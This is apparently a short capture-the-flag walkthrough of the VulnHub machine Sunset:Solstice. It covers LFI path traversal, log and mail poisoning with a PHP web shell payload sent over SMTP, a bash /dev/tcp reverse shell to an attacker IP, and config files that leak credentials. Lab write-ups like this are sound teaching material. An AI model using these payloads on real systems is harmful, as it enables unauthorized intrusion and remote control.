
# Sunset:Solstice Walkthrough

**VulnHub Link:** [Sunset:Solstice](https://www.vulnhub.com/entry/sunset-solstice,499/)
**Difficulty:** Easy
**Release Date:** 26 Jun 2020


## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.175
```
## 2.Web Enumeration
```bash
dirb http://192.168.100.175
```

ftp 2121 service anonymous access is allowed but not beneficial.

in 192.168.100.90:8593 , .php?book = /../../../../../../etc/passwd

miguel user found

../../../../../var/mail/www-data


burpsuite executing and user-agent--> <?php system($_GET['cmd']); ?>

in repeater --> reading from mails 

telnet 192.168.100.90 --> 
1) helo ok
2)mail from: root@solstice
3)rcpt to: www-data@solstice
4)data
5)subject: <?php system($_GET["cmd"]); ?>
6)<message wanted>
7) .


/var/mail/www-data&cmd=id and found id response

encoding --> bash -c '/bin/bash -i >& /dev/tcp/192.168.100.14/4444 0>&1' and send in repeater and got connection via netcat

## 3.Privilege Escalation

in /var/tmp/webserver_2/project/config.php and config.sample.php files contains credentials

root flag captured..!
